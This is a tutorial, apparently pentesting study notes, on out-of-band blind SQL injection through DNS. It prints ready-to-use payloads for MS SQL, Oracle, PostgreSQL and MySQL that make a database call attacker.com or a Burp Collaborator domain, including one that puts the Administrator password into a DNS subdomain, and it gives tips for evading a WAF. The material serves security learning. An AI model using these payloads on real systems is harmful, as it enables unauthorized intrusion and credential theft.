# Out-of-Band (OAST) Blind SQL Injection — Explained Simply

## The Problem This Solves

Sometimes the SQL query runs **asynchronously**:

- The web server starts the query
- It **immediately** returns a response to the user
- The query executes **in the background** in a separate thread

**Result:** No timing difference. No error message. No content difference. **Nothing in the HTTP response reveals anything.**

So you can't use:
- ❌ Boolean-based (response doesn't differ)
- ❌ Error-based (errors are hidden)
- ❌ Time-based (response isn't delayed — it returns instantly)

**What's left?** Make the **database itself** call out to a server you control.

---

## The Core Idea: DNS Exfiltration

You make the database **send a DNS request** to a domain you own. When the DNS request arrives, you know the query executed — and the **domain name itself** can carry stolen data.

**Analogy:**
You can't talk to the prisoner (database) directly. But the prisoner can **throw a paper airplane out the window**. If you're standing outside, you can **see the airplane** — and it can **carry a note**.

DNS is that paper airplane.

---

## Why DNS Specifically?

| Reason | Explanation |
|--------|-------------|
| **Almost always allowed** | Firewalls rarely block DNS — the internet depends on it |
| **Works from anywhere** | Even internal networks with no other egress |
| **Universal support** | Every OS, every DB, every language |
| **Burp Collaborator handles it** | No need to build your own DNS server |

---

## 🎯 The MS SQL Server Payload

The text shows:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

**Breaking it down:**

| Part | Meaning |
|------|---------|
| `;` | End the first SQL statement |
| `exec master..xp_dirtree` | Call a built-in MS SQL procedure that accesses files/network shares |
| `'//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'` | A UNC path pointing to your Collaborator domain |
| `--` | Comment out the rest of the query |

**What happens:**
1. `xp_dirtree` tries to **list files** on `\\0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net\a`
2. To do that, Windows **performs a DNS lookup** for `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
3. Burp Collaborator **receives the DNS request**
4. **You get a hit** → the injection works

---

## 🎯 How to Use Burp Collaborator

### Step 1: Get a Collaborator Domain

1. In Burp: **Burp menu → Burp Collaborator client**
2. Click **"Copy to clipboard"**
3. You get a unique domain like:
   ```
   0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
   ```

### Step 2: Build the Payload

Replace the Collaborator domain in the payload:

```
'; exec master..xp_dirtree '//YOUR-COLLABORATOR-DOMAIN/a'--
```

### Step 3: Send the Payload

Inject it into the vulnerable parameter (e.g., the `TrackingId` cookie).

### Step 4: Poll Collaborator

1. Go back to the **Burp Collaborator client**
2. Click **"Poll now"**
3. Look for **DNS** interactions

**If you see a DNS hit → the injection works.** ✅

---

## 🎯 Why OAST Is Powerful

### 1. **It works when nothing else does**

If the query runs asynchronously, boolean, error, and time-based techniques all fail. OAST succeeds because it doesn't depend on the HTTP response at all.

### 2. **It can exfiltrate data directly**

Instead of just "yes/no," you can include **actual data** in the DNS query:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.YOUR-COLLABORATOR-DOMAIN/a"')--
```

The password is **embedded in the subdomain** of the DNS request. When Collaborator receives the DNS hit, you see:

```
<password>.YOUR-COLLABORATOR-DOMAIN
```

**The password is right there in the log.**

### 3. **It bypasses most defenses**

- No SQL error needed
- No timing signal needed
- No response content needed
- Firewalls usually allow DNS

---

## 🎯 Database-Specific Payloads

Different databases have different ways to trigger DNS:

### Microsoft SQL Server

```sql
'; exec master..xp_dirtree '//attacker.com/a'--
'; exec master..xp_fileexist '\\attacker.com\a'--
'; exec master..xp_subdirs '\\attacker.com\a'--
```

### Oracle

```sql
'; SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual--
'; SELECT HTTPURITYPE('http://attacker.com/').GETCLOB() FROM dual--
'; SELECT DBMS_LDAP.INIT('attacker.com', 389) FROM dual--
```

### PostgreSQL

```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
'; SELECT * FROM dblink('host=attacker.com user=x dbname=y', 'SELECT 1')--
```

### MySQL (Windows)

```sql
'; SELECT LOAD_FILE('\\\\attacker.com\\a')--
'; SELECT ... INTO OUTFILE '\\\\attacker.com\\a'--
```

### MySQL (Linux)

```sql
'; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--
```

**Note:** MySQL doesn't have built-in DNS-triggering functions, but **LOAD_FILE** can be abused on Windows to trigger SMB (which triggers DNS).

---

## 🎯 Full Attack Flow

```
1. Get Collaborator domain: abc123.oastify.com

2. Send payload:
   TrackingId=x'; exec master..xp_dirtree '//abc123.oastify.com/a'--

3. Server executes query
   → xp_dirtree tries to access the UNC path
   → Windows does a DNS lookup for abc123.oastify.com

4. Collaborator receives DNS request
   → You see: "Received DNS lookup from <target-ip> for abc123.oastify.com"

5. Injection confirmed ✅
```

**To exfiltrate data**, replace the domain with:

```
'//<extracted-data>.abc123.oastify.com/a'
```

Every character you extract generates a new DNS lookup. You read the results from Collaborator's log.

---

## 🎯 Common Pitfalls

| Problem | Cause | Fix |
|---------|-------|-----|
| **No Collaborator hit** | Wrong DB function | Try different payloads per DB |
| **Hit but no data** | DNS-only isn't enough to send full data | Use multiple subdomains or encode data in the subdomain |
| **WAF blocks the payload** | `xp_dirtree` or `exec` blacklisted | Try obfuscation or alternative functions |
| **Slow** | Each DNS lookup takes time | Use efficient encoding |
| **Only first hit shows** | DNS caching | Add random subdomain prefix for each request |

---

## 🎯 Why This Matters in Real Pentesting

**OAST is the ultimate fallback when the app is "blind":**

- Blind SQLi with async queries → OAST
- Blind XXE with no response → OAST
- Blind SSRF with no response → OAST
- Blind command injection with no output → OAST

**Any time you need to confirm "did my payload execute on the server?" but can't see a response — OAST is the answer.**

---

## Summary Table

| Concept | Plain English |
|---------|--------------|
| **The problem** | Async query → no response difference |
| **The solution** | Make the DB send a DNS request to a server you control |
| **Why DNS** | Almost never blocked by firewalls |
| **The tool** | Burp Collaborator (or your own DNS server) |
| **MS SQL payload** | `exec master..xp_dirtree '//collaborator.com/a'` |
| **Oracle payload** | `UTL_INADDR.GET_HOST_ADDRESS('collaborator.com')` |
| **PostgreSQL payload** | `COPY ... TO PROGRAM 'nslookup collaborator.com'` |
| **Data exfil** | Embed data in the subdomain of the DNS request |
| **Confirmation** | Poll Collaborator for DNS/HTTP hits |

---

## The Big Takeaway

> **When the application gives you no signal at all, make the database call you on the phone.**

OAST turns a completely invisible vulnerability into a **fully confirmable, extractable** one — all through DNS, the one protocol virtually every network allows out.

**You've now covered all four blind SQLi techniques:**

| # | Technique | Signal |
|---|-----------|--------|
| 1 | Boolean-based | Content difference |
| 2 | Error-based | Error response |
| 3 | Time-based | Response delay |
| 4 | **OAST** | Outbound DNS/HTTP |

Each one is a fallback for when the previous one fails. **OAST is the last resort — and the most powerful.**